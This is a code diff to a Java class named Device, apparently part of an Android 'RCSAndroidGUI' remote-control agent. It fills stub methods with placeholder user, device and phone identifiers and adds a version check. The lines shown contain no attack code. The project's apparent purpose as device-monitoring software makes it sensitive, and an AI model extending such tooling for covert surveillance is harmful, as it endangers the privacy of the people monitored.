@@ -6,6 +6,10 @@
  **********************************************/
 package com.ht.RCSAndroidGUI;
 
+import com.ht.RCSAndroidGUI.utils.Check;
+import com.ht.RCSAndroidGUI.utils.Utils;
+import com.ht.RCSAndroidGUI.utils.WChar;
+
 import android.content.ContentResolver;
 
 public class Device {
@@ -37,23 +41,26 @@ public class Device {
 	}
 
 	public byte[] getWUserId() {
-		// TODO Auto-generated method stub
-		return null;
+		// TODO 
+		return WChar.getBytes("MyUSERId");
 	}
 
 	public byte[] getWDeviceId() {
-		// TODO Auto-generated method stub
-		return null;
+		// TODO 
+		return WChar.getBytes("MyDEVId");
 	}
 
 	public byte[] getWPhoneNumber() {
-		// TODO Auto-generated method stub
-		return null;
+		// TODO 
+		return WChar.getBytes("+123456");
 	}
 
 	public byte[] getVersion() {
-		// TODO Auto-generated method stub
-		return null;
+		 final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
+	        //#ifdef DBC
+	        Check.ensures(versionRet.length == 4, "Wrong version len");
+	        //#endif
+	        return versionRet;
 	}
 
 	/*
